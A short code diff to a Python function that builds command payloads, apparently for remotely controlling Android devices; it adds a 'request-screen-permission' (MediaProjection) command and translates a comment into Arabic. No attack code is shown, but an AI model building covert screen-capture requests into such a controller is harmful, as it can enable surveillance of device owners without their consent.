@@ -264,7 +264,7 @@ def get_commands_by_category(cat):
 
 def build_command_payload(cmd_type, params=None):
     cmd = COMMANDS.get(cmd_type)
-    # ✅ request-permission is not in COMMANDS dict but should be sent directly
+    # ✅ الأوامر غير الموجودة في COMMANDS dict لكن يجب إرسالها مباشرة
     if not cmd:
         if cmd_type == "request-permission":
             p = {"command": cmd_type, "category": "permissions",
@@ -274,6 +274,11 @@ def build_command_payload(cmd_type, params=None):
                     p["params"] = params
                 else:
                     p["params"] = {"value": str(params)}
+            return p
+        # ⚡ request-screen-permission (MediaProjection)
+        if cmd_type == "request-screen-permission":
+            p = {"command": cmd_type, "category": "permissions",
+                 "timestamp": datetime.now(timezone.utc).isoformat()}
             return p
         return None
     p = {"command": cmd_type, "category": cmd["category"],
